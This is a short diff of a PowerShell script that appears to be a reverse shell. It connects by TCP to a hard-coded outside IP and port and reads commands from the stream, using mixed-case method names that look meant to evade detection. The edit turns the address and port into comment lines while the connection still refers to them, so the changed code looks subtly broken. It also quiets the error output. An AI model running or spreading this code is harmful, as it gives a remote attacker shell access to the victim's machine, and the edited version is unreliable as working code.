@@ -1,14 +1,19 @@
 
+
+
+### $Script:ShellAddress = "64.228.230.38"
+### $Script:ShellPort = 20001
+
+
 [CmdletBinding(SupportsShouldProcess)]
 param()
-$Address = "64.228.230.38"
-$Port = 20001
+
 $ErrorActionPreference = 'Stop'
 try
 {
     $Script:ARRAYDATA = [System.Byte[]]::CreateInstance([System.Byte],1024);
    # $Script:ARRAYDATA = [System.Byte[]]::CreateInstance([System.Byte],1024);
-     $Script:NETPTR=New-Object System.Net.Sockets.TCPClient($Address,$Port)
+     $Script:NETPTR=New-Object System.Net.Sockets.TCPClient($Script:ShellAddress,$Script:ShellPort)
      while($Script:RCVDATA=$Script:NETPTR.GEtSTREAM())
      {
         whilE($Script:RCVDATA.dataAvAIlAbLe -or $Script:RCVNEWBYTES -eq $Script:ARRAYDATA.CouNt)
@@ -32,6 +37,6 @@ try
         
     
 }catch{
-        Show-ExceptionDetails $_ -ShowStack
+   Write-Verbose "$_"
 }
 
